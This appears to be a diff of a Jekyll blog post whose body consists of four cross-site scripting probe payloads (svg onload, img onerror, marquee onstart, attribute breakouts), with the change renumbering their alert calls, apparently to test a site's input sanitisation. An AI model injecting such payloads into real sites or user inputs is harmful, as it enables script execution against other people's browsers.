@@ -6,7 +6,7 @@ categories: jekyll update
 ---
 
 
-<xml:namespace prefix="t"><svg><style>&lt;img/src=x onerror=alert(document.domain)// </b> 
-“><svg/onload=alert(document.domain)>”@x.y
-<marquee onstart=alert(1)>
-'>"><svg/onload=alert()>
+<xml:namespace prefix="t"><svg><style>&lt;img/src=x onerror=alert(1)// </b> 
+“><svg/onload=alert(2)>”@x.y
+<marquee onstart=alert(3)>
+'>"><svg/onload=alert(4)>
